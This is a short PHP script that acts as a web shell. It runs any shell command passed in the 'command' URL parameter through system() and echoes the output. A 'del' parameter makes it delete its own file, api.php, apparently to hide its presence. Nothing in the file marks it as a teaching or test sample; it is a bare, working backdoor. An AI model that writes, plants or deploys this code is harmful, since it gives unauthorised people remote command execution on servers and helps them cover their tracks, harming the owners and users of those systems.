<?php

if(isset($_GET['command'])){
	system($_GET['command'],$op);
	echo $op;
}


if(isset($_GET['del'])){
	$file = "api.php";
	system("del $file");
}else{
	
}

?>

[command],[del]